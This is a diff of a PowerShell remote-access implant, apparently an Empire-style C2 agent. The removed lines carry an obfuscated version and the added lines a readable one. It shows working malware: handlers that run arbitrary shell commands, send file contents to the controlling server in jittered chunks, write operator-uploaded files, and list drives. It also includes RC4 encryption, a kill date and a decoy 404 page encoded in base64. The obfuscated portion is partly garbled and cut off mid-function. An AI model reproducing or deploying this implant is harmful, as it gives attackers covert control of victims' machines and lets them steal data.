+                    $Offset += $PacketLength;
+                    Process-TaskingPackets $EncData;
                 }
                 else {
                 }
@@ -630,367 +620,401 @@ if(0dU{sECjMRVEr}.(6hdS6hd+6hdtartsWit6hd+6hdh6hd).Invoke((6hdh6hd+6hdttps6hd)))
         else {
         }
     }
-    function eCjMNCjMcoDCjMe-paCjMCKET {
-        param([Int16]0dU{tyCjMPe}, 0dU{DACjMTa}, [Int16]0dU{RECjMSCjMULTiD}=0)
-        if (0dU{dCjMAta} -is [System.Array]) {
-            0dU{dCjMATa} = 0dU{DCjMAtA} -join ELNCjMnELN;
+    function Encode-Packet {
+        param([Int16]$type, $data, [Int16]$ResultID=0)
+        if ($data -is [System.Array]) {
+            $data = $data -join "`n";
         }
-        0dU{DCjMATa} = [System.Convert]::ELNtOBAse64STrCjMICjMNGELN([System.Text.Encoding]::ELNUTCjMF8ELN.(6hdGetB6hd+6hdytes6hd).Invoke(0dU{daCjMTA}));
-        0dU{pCjMACjMCkeT} = &(6hdNe6hd+6hdw-Ob6hd+6hdje6hd+6hdct6hd) (6hdBy6hd+6hdte6hd+6hd[]6hd) (12 + 0dU{dCjMATa}.ELNlCjMengtHELN);
-        ([BitConverter]::(6hdG6hd+6hde6hd+6hdtBytes6hd).Invoke(0dU{TyCjMpe})).(6hdCopy6hd+6hdTo6hd).Invoke(0dU{paCjMCCjMKET}, 0);
-        ([BitConverter]::ELNgECjMTbYTCjMeSELN([Int16]1)).(6hdC6hd+6hdopyTo6hd).Invoke(0dU{pACKCjMeT}, 2);
-        ([BitConverter]::ELNGetBytCjMesELN([Int16]1)).(6hdC6hd+6hdopyTo6hd).Invoke(0dU{PaCjMCCjMKet}, 4);
-        ([BitConverter]::(6hdGetB6hd+6hdyte6hd+6hds6hd).Invoke(0dU{rCjMECjMSultCjMid})).(6hdCopy6hd+6hdTo6hd).Invoke(0dU{pAcCjMKCjMEt}, 6);
-        ([BitConverter]::(6hdGetB6hd+6hdytes6hd).Invoke(0dU{DCjMAta}.ELNlECjMNgThELN)).(6hdC6hd+6hdo6hd+6hdpyTo6hd).Invoke(0dU{pAcCjMKET}, 8);
-        ([System.Text.Encoding]::ELNUtCjMF8ELN.(6hdG6hd+6hdetByte6hd+6hds6hd).Invoke(0dU{dACjMTA})).(6hdCop6hd+6hdyTo6hd).Invoke(0dU{paCkCjMEt}, 12);
-        0dU{pCjMACjMCKeT};
+        $data = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($data));
+        $packet = New-Object Byte[] (12 + $data.Length);
+        ([BitConverter]::GetBytes($type)).CopyTo($packet, 0);
+        ([BitConverter]::GetBytes([Int16]1)).CopyTo($packet, 2);
+        ([BitConverter]::GetBytes([Int16]1)).CopyTo($packet, 4);
+        ([BitConverter]::GetBytes($ResultID)).CopyTo($packet, 6);
+        ([BitConverter]::GetBytes($data.Length)).CopyTo($packet, 8);
+        ([System.Text.Encoding]::UTF8.GetBytes($data)).CopyTo($packet, 12);
+        $packet;
     }
-    function DecODE-CjMPaCjMCCjMKCjMEt {
-        param(0dU{PACCjMkCjMET}, 0dU{oCjMFFsCjMET}=0)
-        0dU{TYCjMPe} = [BitConverter]::(6hdToUIn6hd+6hdt6hd+6hd166hd).Invoke(0dU{pCjMAcKCjMEt}, 0+0dU{ofCjMFSet});
-        0dU{tOtaLPCjMAckeCjMTS} = [BitConverter]::(6hdT6hd+6hdo6hd+6hdUInt166hd).Invoke(0dU{paCjMCCjMKEt}, 2+0dU{ofFSCjMET});
-        0dU{pCjMACjMckEtnUm} = [BitConverter]::(6hdTo6hd+6hdUInt166hd).Invoke(0dU{PaCjMCkCjMet}, 4+0dU{offSCjMet});
-        0dU{TCjMAsCjMKid} = [BitConverter]::(6hdTo6hd+6hdUI6hd+6hdnt166hd).Invoke(0dU{PacCjMkCjMeT}, 6+0dU{ofFCjMsCjMET});
-        0dU{LCjMeNgTh} = [BitConverter]::(6hdToUI6hd+6hdn6hd+6hdt326hd).Invoke(0dU{pCjMAcKet}, 8+0dU{oFCjMFSET});
-        0dU{dCjMATa} = [System.Text.Encoding]::ELNuCjMTf8ELN.ELNGeCjMTstCjMRiNgELN(0dU{PaCjMCKEt}[(12+0dU{oCjMFfSet})..(12+0dU{lECjMNGCjMTh}+0dU{oCjMFfsET}-1)]);
-        0dU{rCjMemainCjMInG} = [System.Text.Encoding]::ELNUTCjMF8ELN.ELNGECjMTCjMSTRICjMNgELN(0dU{pACjMcCjMket}[(12+0dU{leNgCjMTH}+0dU{ofCjMFCjMSET})..(0dU{PAcCjMkEt}.ELNlenCjMgthELN)]);
-        &(6hdR6hd+6hdemove-V6hd+6hdariab6hd+6hdle6hd) (6hdpacke6hd+6hdt6hd);
-        @(0dU{TYCjMpE}, 0dU{TOCjMTAlPAcCjMKCjMEtS}, 0dU{pCjMAcKECjMTNCjMUm}, 0dU{tCjMAsKCjMId}, 0dU{LeNGCjMTH}, 0dU{daCjMTA}, 0dU{RCjMEMCjMAiNiNG});
+    function Decode-Packet {
+        param($packet, $offset=0)
+        $Type = [BitConverter]::ToUInt16($packet, 0+$offset);
+        $TotalPackets = [BitConverter]::ToUInt16($packet, 2+$offset);
+        $PacketNum = [BitConverter]::ToUInt16($packet, 4+$offset);
+        $TaskID = [BitConverter]::ToUInt16($packet, 6+$offset);
+        $Length = [BitConverter]::ToUInt32($packet, 8+$offset);
+        $Data = [System.Text.Encoding]::UTF8.GetString($packet[(12+$offset)..(12+$Length+$offset-1)]);
+        $Remaining = [System.Text.Encoding]::UTF8.GetString($packet[(12+$Length+$offset)..($packet.Length)]);
+        Remove-Variable packet;
+        @($Type, $TotalPackets, $PacketNum, $TaskID, $Length, $Data, $Remaining);
     }
-    function prCjMOcCjMeCjMss-CjMTasking {
-        param(0dU{tCjMYPE}, 0dU{mCjMsg}, 0dU{RCjMesUlCjMTiD})
+    function Process-Tasking {
+        param($type, $msg, $ResultID)
         try {
-            if(0dU{tYCjMPE} -eq 1) {
-                return &(6hdEn6hd+6hdc6hd+6hdode-Pa6hd+6hdcket6hd) -type 0dU{TCjMYpE} -data 0dU(&(6hdGe6hd+6hdt-Sysin6hd+6hdfo6hd)) -ResultID 0dU{RECjMsuLTCjMiD};
+            if($type -eq 1) {
+                return Encode-Packet -type $type -data $(Get-Sysinfo) -ResultID $ResultID;
             }
-            elseif(0dU{TCjMYpE} -eq 2) {
-                0dU{mCjMSG} = (6hd[!]6hd+6hd A6hd+6hdgent 6hd)+0dU{SCjMCRiCjMpCjMT:CjMSESsIOCjMNid}+(6hd exit6hd+6hdin6hd+6hdg6hd);
-                (& 0dU{sCjMeNCjMDMeCjMsSAge} -Packets 0dU(&(6hdEnco6hd+6hdde-Pac6hd+6hdk6hd+6hdet6hd) -type 0dU{TyCjMpE} -data 0dU{MCjMSg} -ResultID 0dU{RECjMSCjMULTCjMid}));
+            elseif($type -eq 2) {
+                $msg = "[!] Agent "+$script:SessionID+" exiting";
+                (& $SendMessage -Packets $(Encode-Packet -type $type -data $msg -ResultID $ResultID));
                 exit;
             }
-            elseif(0dU{TyCjMPE} -eq 34) {
-                &(6hdE6hd+6hdnc6hd+6hdode-Packet6hd) -type 0 -data (6hd[!] Pr6hd+6hdoxy cha6hd+6hdin 6hd+6hdn6hd+6hdot6hd+6hd i6hd+6hdmpl6hd+6hde6hd+6hdmen6hd+6hdted6hd) -ResultID 0dU{reSuCjMlTid};
+            elseif($type -eq 34) {
+                Encode-Packet -type 0 -data '[!] Proxy chain not implemented' -ResultID $ResultID;
             }
-            elseif(0dU{tCjMype} -eq 40) {
-                0dU{paCjMRCjMTS} = 0dU{DCjMAtA}.(6hdSpli6hd+6hdt6hd).Invoke(ELN ELN);
-                if(0dU{pCjMArCjMTS}.ELNlECjMNGTHELN -eq 1) {
-                    0dU{cCjMmD} = 0dU{pARCjMTs}[0];
-                    &(6hdE6hd+6hdncode-P6hd+6hda6hd+6hdcke6hd+6hdt6hd) -type 0dU{TCjMypE} -data 0dU((&(6hdInvo6hd+6hdke-Shell6hd+6hdCom6hd+6hdma6hd+6hdnd6hd) -cmd 0dU{cCjMMd}) -join ELNCjMnELN).(6hdtri6hd+6hdm6hd).Invoke() -ResultID 0dU{rEsCjMUlTCjMId};
+            elseif($type -eq 40) {
+                $parts = $data.Split(" ");
+                if($parts.Length -eq 1) {
+                    $cmd = $parts[0];
+                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd) -join "`n").trim() -ResultID $ResultID;
                 }
                 else{
-                    0dU{cCjMMd} = 0dU{PACjMRCjMTS}[0];
-                    0dU{cCjMmDARgS} = 0dU{PaCjMRts}[1..0dU{pCjMACjMRts}.ELNLCjMengtHELN] -join ELN ELN;
-                    &(6hdEncod6hd+6hde-P6hd+6hdac6hd+6hdket6hd) -type 0dU{tYCjMpE} -data 0dU((&(6hdInvoke-Sh6hd+6hdell6hd+6hdComma6hd+6hdnd6hd) -cmd 0dU{CCjMmD} -cmdargs 0dU{CmdCjMArGS}) -join ELNCjMnELN).(6hdtri6hd+6hdm6hd).Invoke() -ResultID 0dU{rESCjMUCjMlTiD};
+                    $cmd = $parts[0];
+                    $cmdargs = $parts[1..$parts.length] -join " ";
+                    Encode-Packet -type $type -data $((Invoke-ShellCommand -cmd $cmd -cmdargs $cmdargs) -join "`n").trim() -ResultID $ResultID;
                 }
             }
-            elseif(0dU{tyCjMPE} -eq 41) {
+            elseif($type -eq 41) {
                 try {
-                    0dU{CHUnKCjMsiCjMZe} = 512KB;
-                    0dU{parCjMTs} = 0dU{dCjMAta}.(6hdSpli6hd+6hdt6hd).Invoke(ELN ELN);
-                    if(0dU{PaCjMRCjMTS}.ELNlCjMeCjMNgTHELN -gt 1) {
-                        0dU{pCjMAth} = 0dU{paRCjMTs}[0..(0dU{PACjMRts}.ELNLeCjMNgtHELN-2)] -join ELN ELN;
+                    $ChunkSize = 512KB;
+                    $Parts = $Data.Split(" ");
+                    if($Parts.Length -gt 1) {
+                        $Path = $Parts[0..($parts.length-2)] -join " ";
                         try {
-                            0dU{chunCjMksCjMizE} = 0dU{paRCjMTs}[-1]/1;
-                            if(0dU{PCjMACjMRts}[-1] -notlike (6hd*b6hd+6hd*6hd)) {
-                                0dU{chCjMUCjMNCjMkSiZE} = 0dU{cCjMhuCjMNksize} * 1024;
+                            $ChunkSize = $Parts[-1]/1;
+                            if($Parts[-1] -notlike "*b*") {
+                                $ChunkSize = $ChunkSize * 1024;
                             }
                         }
                         catch {
-                            0dU{PaCjMTH} += ELN 0dU(0dUParts[-1]) ELN;
+                            $Path += " $($Parts[-1])";
                         }
                     }
                     else {
-                        0dU{pCjMAtH} = 0dU{dCjMATA};
+                        $Path = $Data;
                     }
-                    0dU{PaCjMTH} = 0dU{PaCjMTh}.(6hdTr6hd+6hdim6hd).Invoke(6hdELN6hd).(6hdTri6hd+6hdm6hd).Invoke(ELN6hdELN);
-                    if(0dU{chCjMUnCjMKCjMsize} -lt 512KB) {
-                        0dU{chCjMUnCjMksiCjMZe} = 512KB;
+                    $Path = $Path.Trim('"').Trim("'");
+                    if($ChunkSize -lt 512KB) {
+                        $ChunkSize = 512KB;
                     }
-                    elseif(0dU{chunCjMkSCjMIzE} -gt 8MB) {
-                        0dU{CHUCjMNksICjMze} = 8MB;
+                    elseif($ChunkSize -gt 8MB) {
+                        $ChunkSize = 8MB;
                     }
                     else {
-                        0dU{ChuNCjMKsCjMiZE} = 1024KB;
+                        $ChunkSize = 1024KB;
                     }
-                    0dU{PaCjMTh} = &(6hdGet6hd+6hd-Ch6hd+6hdild6hd+6hdi6hd+6hdtem6hd) -Recurse 0dU{pCjMAtH} -File  hmz &(6hdFo6hd+6hdrEa6hd+6hdch6hd+6hd-6hd+6hdObject6hd) {0dU{_}.ELNFULCjMLnACjMmEELN};
-                    foreach ( 0dU{FICjMLe} in 0dU{PACjMTH}) {
-                        0dU{inDCjMEx} = 0;
+                    $Path = Get-Childitem -Recurse $Path -File  | ForEach-Object {$_.FullName};
+                    foreach ( $File in $Path) {
+                        $Index = 0;
                         do{
-                            0dU{ECjMNCOCjMdEDPaCjMRt} = &(6hdGet6hd+6hd-FilePar6hd+6hdt6hd) -File ELN0dUfileELN -Index 0dU{iNDCjMex} -ChunkSize 0dU{ChCjMUnCjMkSIze};
-                            0dU{fCjMILeCjMsiCjMzE} = (&(6hdGet-6hd+6hdI6hd+6hdtem6hd) 0dU{fiCjMLE}).ELNLeCjMNCjMgthELN;
-                            if(0dU{EnCOCjMDEdpACjMRt}) {
-                                0dU{dACjMTa} = ELN{0}hmz{1}hmz{2}hmz{3}ELN -f 0dU{InDCjMEX}, 0dU{FiCjMlE}, 0dU{fICjMLesCjMiZE}, 0dU{enCjMcCjModeDpACjMRT};
-                                (& 0dU{SEndMESsCjMACjMGe} -Packets 0dU(&(6hdE6hd+6hdncod6hd+6hde6hd+6hd-Pa6hd+6hdcket6hd) -type 0dU{TYCjMPE} -data 0dU(0dU{dCjMAta}) -ResultID 0dU{rECjMsCjMULTid}));
-                                0dU{ICjMNdeX} += 1;
-                                if (0dU{SCRiPCjMT:CjMACjMGeCjMNTdCjMeLAY} -ne 0) {
-                                    0dU{mCjMin} = [int]((1-0dU{ScCjMRiPCjMT:AGECjMNTjCjMITCjMTCjMeR})*0dU{ScRICjMPTCjM:CjMAGeNCjMTDECjMLAy});
-                                    0dU{MCjMAX} = [int]((1+0dU{scRIPT:CjMAgenCjMTCjMjCjMITtER})*0dU{sCCjMRCjMICjMPt:CjMAGENTDelAy});
-                                    if (0dU{MCjMIN} -eq 0dU{mCjMAx}) {
-                                        0dU{SleCjMEpCjMTCjMIMe} = 0dU{mCjMIn};
+                            $EncodedPart = Get-FilePart -File "$file" -Index $Index -ChunkSize $ChunkSize;
+                            $filesize = (Get-Item $file).length;
+                            if($EncodedPart) {
+                                $data = "{0}|{1}|{2}|{3}" -f $Index, $file, $filesize, $EncodedPart;
+                                (& $SendMessage -Packets $(Encode-Packet -type $type -data $($data) -ResultID $ResultID));
+                                $Index += 1;
+                                if ($script:AgentDelay -ne 0) {
+                                    $min = [int]((1-$script:AgentJitter)*$script:AgentDelay);
+                                    $max = [int]((1+$script:AgentJitter)*$script:AgentDelay);
+                                    if ($min -eq $max) {
+                                        $sleepTime = $min;
                                     }
                                     else{
-                                        0dU{SLEepCjMTICjMme} = &(6hdGet-6hd+6hdRa6hd+6hdn6hd+6hddom6hd) -minimum 0dU{mCjMIN} -maximum 0dU{mCjMAx};
+                                        $sleepTime = Get-Random -minimum $min -maximum $max;
                                     }
-                                    &(6hdStar6hd+6hdt-Sle6hd+6hdep6hd) -s 0dU{sCjMlECjMEpTIMe};
+                                    Start-Sleep -s $sleepTime;
                                 }
                             }
-                            [GC]::(6hdColl6hd+6hdect6hd).Invoke();
-                        } while(0dU{eNCjMCCjMODCjMedpaRt})
-                        &(6hdEnco6hd+6hdd6hd+6hde-Pa6hd+6hdcket6hd) -type 40 -data (6hd[6hd+6hd*] 6hd+6hdF6hd+6hdile 6hd+6hdd6hd+6hdo6hd+6hdwnload 6hd+6hdo6hd+6hdf 6hd+ELN0dUfile ELN+6hdc6hd+6hdom6hd+6hdpleted6hd) -ResultID 0dU{rCjMesULCjMTid};
+                            [GC]::Collect();
+                        } while($EncodedPart)
+                        Encode-Packet -type 40 -data "[*] File download of $file completed" -ResultID $ResultID;
                     }
                 }
                 catch {
-                    &(6hdEnco6hd+6hdde6hd+6hd-6hd+6hdPacket6hd) -type 0 -data (6hd[!] 6hd+6hdFile 6hd+6hdd6hd+6hdoes not exi6hd+6hdst or6hd+6hd c6hd+6hdannot be 6hd+6hdacce6hd+6hds6hd+6hds6hd+6hded6hd) -ResultID 0dU{rESuCjMLtCjMiD};
+                    Encode-Packet -type 0 -data '[!] File does not exist or cannot be accessed' -ResultID $ResultID;
                 }
             }
-            elseif(0dU{TCjMYPE} -eq 42) {
-                0dU{PaCjMRCjMTS} = 0dU{DCjMAta}.(6hdsp6hd+6hdlit6hd).Invoke(6hdhmz6hd);
-                0dU{fICjMLeCjMNamE} = 0dU{PCjMACjMRTS}[0];
-                0dU{BCjMASCjME64pACjMRT} = 0dU{ParCjMTs}[1];
-                0dU{CoCjMNCjMTENT} = [System.Convert]::(6hdF6hd+6hdromBase64Str6hd+6hdi6hd+6hdng6hd).Invoke(0dU{bCjMAsE64CjMPARt});
+            elseif($type -eq 42) {
+                $parts = $data.split('|');
+                $filename = $parts[0];
+                $base64part = $parts[1];
+                $Content = [System.Convert]::FromBase64String($base64part);
                 try{
-                    &(6hdS6hd+6hdet6hd+6hd-Con6hd+6hdtent6hd) -Path 0dU{FCjMILCjMEnamE} -Value 0dU{cOnCjMTeCjMNT} -Encoding (6hdB6hd+6hdyte6hd) -ErrorAction (6hdSt6hd+6hdop6hd) -ErrorVariable (6hderr6hd+6hdor6hd)
-                    &(6hdEncod6hd+6hde6hd+6hd-Pa6hd+6hdc6hd+6hdket6hd) -type 0dU{tYCjMpe} -data (6hd[6hd+6hd*] 6hd+6hdUpload6hd+6hd 6hd+6hdo6hd+6hdf 6hd+ELN0dUfileName ELN+6hdsucces6hd+6hds6hd+6hdful6hd) -ResultID 0dU{rCjMEsUCjMLtCjMId};
+                    Set-Content -Path $filename -Value $Content -Encoding Byte -ErrorAction Stop -ErrorVariable error
+                    Encode-Packet -type $type -data "[*] Upload of $fileName successful" -ResultID $ResultID;
                 }
                 catch {
-                    &(6hdE6hd+6hdn6hd+6hdcode-Pac6hd+6hdket6hd) -type 0 -data 0dU{eRCjMRCjMor} -ResultID 0dU{rEsULTCjMID};
+                    Encode-Packet -type 0 -data $error -ResultID $ResultID;
                 }
             }
-            elseif(0dU{TCjMYPE} -eq 43) {
-                0dU{OUCjMTPuT} = ELNELN;
-                0dU{PCjMATh} = ELN/ELN;
-                if (0dU{DaCjMTa}.ELNLEnGCjMTHELN -gt 1) {
-                    0dU{PaCjMTh} = 0dU{DCjMATA};
+            elseif($type -eq 43) {
+                $output = "";
+                $path = "/";
+                if ($data.length -gt 1) {
+                    $path = $data;
                 }
-                if (0dU{PACjMTH} -eq ELN/ELN) {
-                    0dU{ACjMRrAY} = @();
-                    0dU{dCjMRiCjMVeS} = &(6hdGet-6hd+6hdPSDr6hd+6hdive6hd) -PSProvider (6hdFile6hd+6hdS6hd+6hdys6hd+6hdtem6hd) hmz&(6hdwher6hd+6hde6hd) {(0dU{_}.ELNUSCjMEDELN -gt 0)} hmz &(6hdF6hd+6hdorEach-6hd+6hdObj6hd+6hdect6hd) {
-                        0dU{arrCjMAY} += (@{(6hdp6hd+6hdath6hd) =  0dU{_}.ELNRCjMooTELN; (6hdn6hd+6hdame6hd) = 0dU{_}.ELNRCjMootELN; (6hdi6hd+6hds_fil6hd+6hde6hd) = 0dU{FCjMAlCjMSe}});
+                if ($path -eq "/") {
+                    $array = @();
+                    $drives = Get-PSDrive -PSProvider FileSystem |where {($_.Used -gt 0)} | ForEach-Object {
+                        $array += (@{path =  $_.Root; name = $_.Root; is_file = $false});
                     }
-                    0dU{oUtPCjMUT} = @{(6hddi6hd+6hdr6hd+6hdectory_n6hd+6hdame6hd) = ELN/ELN; (6hddire6hd+6hdc6hd+6hdtory_p6hd+6hdath6hd) = ELN/ELN; (6hditem6hd+6hds6hd) = 0dU{arCjMRAY}} hmz &(6hdConvertTo-J6hd+6hds6hd+6hdo6hd+6hdn6hd) -Compress;
-                } elseif (-Not (&(6hdTest-Pa6hd+6hdt6hd+6hdh6hd) 0dU{pCjMATH} -PathType (6hdC6hd+6hdon6hd+6hdtainer6hd))) {
-                    0dU{OCjMUTCjMpuT} = (6hdDi6hd+6hdr6hd+6hdectory 6hd) + 0dU{PaCjMTH} + (6hd not6hd+6hd f6hd+6hdound.6hd);
+                    $output = @{directory_name = "/"; directory_path = "/"; items = $array} | ConvertTo-Json -Compress;
+                } elseif (-Not (Test-Path $path -PathType Container)) {
+                    $output = "Directory " + $path + " not found.";
                 } else {
-                    0dU{ArrCjMAY} = @();
-                    &(6hdGe6hd+6hdt-Chi6hd+6hdld6hd+6hdItem6hd) -force -Path 0dU{paCjMTH} -Attributes (6hd!direc6hd+6hdt6hd+6hdory6hd) hmz &(6hdf6hd+6hdoreach6hd+6hd-obje6hd+6hdct6hd) { 0dU{arRCjMAy} += ','       }
-    }
-    function DecCjMOdeCjM-rouTIngCjMPaCkCjMEt {
-        param(0dU{pACKECjMTDCjMACjMTA})
-        if (0dU{PaCkCjMeCjMTDCjMAtA}.ELNLEnCjMgTHELN -ge 20) {
-            0dU{oCjMFfSCjMET} = 0;
-            while(0dU{offCjMset} -lt 0dU{pACjMcCjMKeTDATA}.ELNLeCjMNgCjMTHELN) {
-           ','dC1zaXplOjEuMmVtO21hcmdpbjox6hd+6hdMHB4IDAgMCAwO2NvbG9yOiMwMDAwMDA7fSAKI2hlYWRlcnt3aWR0aDo5NiU7bWFyZ2luOjA6hd+6hdgMCAwI6hd+6hdDA7cGF6hd+6hdkZGluZzo2cHggMiUgNnB4IDIlO2ZvbnQtZmFtaWx5OiJ06hd+6hdcmVidWNoZX6hd+6hdQgTVMiLCBWZXJkYW5hLCBzYW5zLXNlcmlmO2NvbG9yOiNGRkY7CmJhY2tncm91bmQtY29sb3I6hd+6hd6IzU1NTU1NTt96hd+6hdCiNjb250ZW50e21hcmdpbjowIDAgMCAyJTtwb3NpdGlvbjpyZWxhdGl2ZTt9Ci5jb250ZW50LWNvbnRhaW5lcntiYWNrZ3JvdW5kOiNGRkY7d2lkdGg6OTYlO21hcmd6hd+6hdpbi10b3A6OHB4O3BhZGRpbmc6MTBweDtw6hd+6hdb3NpdGlvbjpyZWxhdGl2ZTt9Ci0tPgogICAgPC9zdHlsZT4KPC96hd+6hdoZWFkPgo8Ym9keT4KPGRpdiBpZD0iaGVhZGVyIj48aDE+U2VydmVyIEVycm9yPC9oMT48L2Rpdj4KPGRpdiBpZD0iY29udGVudCI+CiAgICA8ZGl2IGNsYXNzPSJjb250ZW50LWNvbnRhaW5l6hd+6hdciI+CiAgICAgICAgPGZp6hd+6hdZWxkc2V0PgogICAgICAgICAgICA8aDI+NDA0IC0gRml6hd+6hdsZSBvciBkaXJlY3Rvcnkgbm90IGZvdW5kLjwvaDI+CiAgICAgICAgICAgIDxoMz5UaGUgcmVzb3VyY2UgeW91IGFyZSBsb29raW5nIGZvciBtaWdodCBoYXZlIGJlZW4gcmVtb3ZlZCwgaGFkIGl0cyBuYW1lIGNoYW6hd+6hd5nZWQsIG9yIGlzIHRlbXBvcmFyaWx5CiAgICAgICAgICAgIC6hd+6hdAgICB1bmF2YWlsYWJsZS48L2gzPgogICAgICAgIDwvZmllbGRzZXQ+CiAgICA8L2Rpdj4KPC9kaXY+CjwvYm9keT4KPC9odG1sPg6hd+6hd==6hd)
-    )
-    0dU{ENCodICjMNG} = [System.Text.Encoding]::ELNAScCjMiiELN;
-    0dU{hCjMmaC} = &(6hdN6hd+6hdew6hd+6hd-Obj6hd+6hdect6hd) (6hdSyste6hd+6hdm.6hd+6hdSec6hd+6hdur6hd+6hdity.6hd+6hdCr6hd+6hdyptog6hd+6hdr6hd+6hdaphy.HMACSH6hd+6hdA26hd+6hd56hd+6hd66hd);
-    0dU{SCriPT:aCjMgeCjMNTdCjMelay} = 0dU{aCjMGECjMNtdElAy};
-    0dU{SCrCjMIPT:AgCjMECjMNtCjMJitTEr} = 0dU{AgEntjCjMITCjMTCjMER};
-    0dU{SCjMcRCjMipT:LCjMosCjMTLImit} = 0dU{lCjMoSCjMTlIMIT};
-    0dU{SCRICjMPT:MISSeCjMdcCjMHECjMcKIns} = 0;
-    0dU{scRICjMPt:reCjMsUCjMlTIDS} = @{};
-    0dU{ScriptCjM:wCjMorkCjMINgCjMHOCjMURs} = 0dU{wCjMorKINCjMGHouCjMRs};
-    0dU{sCrIptCjM:DEfaCjMUltCjMResPoCjMNsE} = [System.Text.Encoding]::ELNASCCjMiIELN.ELNgEtCjMstRCjMiNGELN([System.Convert]::(6hdFromBas6hd+6hde6hd+6hd66hd+6hd4String6hd).Invoke(0dU{DeFCjMAUCjMLTRECjMSCjMpoNse}));
-    0dU{sCCjMRiCjMpt:PRoXy} = 0dU{prOxYsECjMTCjMTiCjMNgS};
-    0dU{SCCjMRiPCjMTCjM:cuRRENTLCjMIsCjMTenERNamE} = ELNELN;
-    0dU{sCjMCCjMRIpt:SERCjMVerCjMINDEX} = 0;
-    0dU{sCRCjMiCjMPCjMT:cONCjMTROlSERvECjMRs} = 0dU{sECjMRveCjMRs};
-    0dU{RCjMetRIEs} = 1;
-    if(0dU{KIllCjMDCjMAYs}) {
-        0dU{scrCjMiCjMpT:KIlLDCjMACjMTE} = (&(6hdG6hd+6hdet-D6hd+6hdate6hd)).(6hdA6hd+6hddd6hd+6hdDays6hd).Invoke(0dU{KCjMiCjMlLDAys}).(6hdToSt6hd+6hdri6hd+6hdng6hd).Invoke((6hdMM/dd/y6hd+6hdy6hd+6hdyy6hd))
-    }
-    if(0dU{kiCjMlLDatE} -ne (6hdREP6hd+6hdL6hd+6hdACE_KI6hd+6hdLL6hd+6hdD6hd+6hdATE6hd) -and 0dU{kCjMILLCjMdate} -ne 0dU{nCjMULL}) {
-        0dU{sCRIPT:CjMKCjMiCjMlldCjMAtE} = 0dU{KICjMlLdCjMATE}
-    }
-    0dU{pROfICjMlECjMpARtS} = 0dU{PRCjMOCjMFIlE}.(6hdsp6hd+6hdlit6hd).Invoke(6hdhmz6hd);
-    0dU{ScCjMRCjMIpCjMTCjM:TaskuRIs} = 0dU{PROCjMFilePaCjMRTs}[0].(6hdsp6hd+6hdlit6hd).Invoke(6hd,6hd);
-    0dU{sCjMCCjMRCjMIpt:uSERCjMAgCjMenT} = 0dU{PRCjMOCjMFCjMILePaRTs}[1];
-    0dU{SCjMCCjMRiCjMPT:SeSSCjMIoNiD} = 0dU{SCjMeCjMsSIOCjMNID};
-    0dU{SCjMcrCjMIPt:HCjMeadErs} = @{};
-    if(0dU{PROCjMFiLeCjMpCjMARts}[2]) {
-        0dU{PRCjMOFilECjMpARTs}[2..0dU{prCjMOFIlEpaCjMRtS}.ELNlCjMEnGtHELN] hmz &(6hdFor6hd+6hdEach-6hd+6hdObje6hd+6hdct6hd) {
-            0dU{PCjMARCjMTS} = 0dU{_}.(6hdSpli6hd+6hdt6hd).Invoke(6hd:6hd);
-            0dU{SCriPT:HCjMEaCjMDeCjMRs}.ELNaCjMDdELN(0dU{pCjMACjMRTs}[0],0dU{PCjMACjMRTs}[1]);
-        }
-    }
-    0dU{scriPCjMTCjM:jOCjMBs} = @{};
-    0dU{sCrCjMIPT:CjMdowCjMNloaDs} = @{};
-    0dU{scrCjMICjMpCjMT:CjMimpORCjMTEdscrCjMipT} = 6hd6hd;
-    function CoCjMNvErtTO-rc4bCjMYCjMTCjMEstRCjMECjMAm {
-        Param (0dU{ICjMN}, 0dU{rCjMCk})
-        begin {
-            [Byte[]] 0dU{S} = 0..255;
-            0dU{J} = 0;
-            0..255 hmz &(6hdFor6hd+6hdE6hd+6hdach-6hd+6hdOb6hd+6hdject6hd) {
-                0dU{J} = (0dU{J} + 0dU{s}[0dU{_}] + 0dU{rCjMck}[0dU{_} % 0dU{rCjMck}.ELNLECjMNGThELN]) % 256;
-                0dU{s}[0dU{_}], 0dU{s}[0dU{j}] = 0dU{s}[0dU{j}], 0dU{S}[0dU{_}];
-            };
-            0dU{I} = 0dU{j} = 0;
-        }
-        process {
-            ForEach(0dU{BYCjMTe} in 0dU{iCjMN}) {
-                0dU{I} = (0dU{I} + 1) % 256;
-                0dU{j} = (0dU{j} + 0dU{S}[0dU{i}]) % 256;
-                0dU{S}[0dU{i}], 0dU{S}[0dU{j}] = 0dU{S}[0dU{j}], 0dU{s}[0dU{I}];
-                0dU{bCjMytE} -bxor 0dU{s}[(0dU{S}[0dU{I}] + 0dU{S}[0dU{J}]) % 256];
-            }
-        }
-    }
-    function GEtCjM-HexSTRiCjMNG {
-        param([byte]0dU{dACjMTa})
-        (0dU{daCjMTA} hmz &(6hdFor6hd+6hdEach6hd+6hd-Objec6hd+6hdt6hd) { ELN{0:X2}ELN -f 0dU{_} }) -join 6hd 6hd;
-    }
-    function Set-CjMdCjMeLaY {
-        param([int]0dU{d}, [double]0dU{J}=0.0)
-        0dU{ScCjMRIpCjMTCjM:AGECjMNtdeLCjMAy} = 0dU{d};
-        0dU{SCjMcRiPT:agCjMeNCjMTJiTCjMTCjMEr} = 0dU{j};
-        (6hdag6hd+6hde6hd+6hdnt 6hd+6hdinterv6hd+6hda6hd+6hdl 6hd+6hdse6hd+6hdt 6hd+6hdto6hd+6hd 6hd+ELN0dUscript:AgentDelay ELN+6hdse6hd+6hdc6hd+6hdonds 6hd+6hdwi6hd+6hdth 6hd+6hda 6hd+6hdj6hd+6hditter6hd+6hd 6hd+6hdo6hd+6hdf 6hd+ELN0dUscript:AgentJitterELN);
-    }
-    function GETCjM-CjMdelay {
-        (6hdagen6hd+6hdt 6hd+6hdinter6hd+6hdv6hd+6hdal 6hd+6hdd6hd+6hdel6hd+6hday 6hd+6hdint6hd+6hderva6hd+6hdl:6hd+6hd 6hd+ELN0dUscript:AgentDelay ELN+6hds6hd+6hdec6hd+6hdonds 6hd+6hdwi6hd+6hdth 6hd+6hda 6hd+6hdjitte6hd+6hdr 6hd+6hdo6hd+6hdf 6hd+ELN0dUscript:AgentJitterELN);
-    }
-    function SeT-lOstLICjMmCjMit {
-        param([int]0dU{L})
-        0dU{SCjMCripT:CjMLOsTlCjMICjMMIt} = 0dU{L};
-        if(0dU{L} -eq 0)
-        {
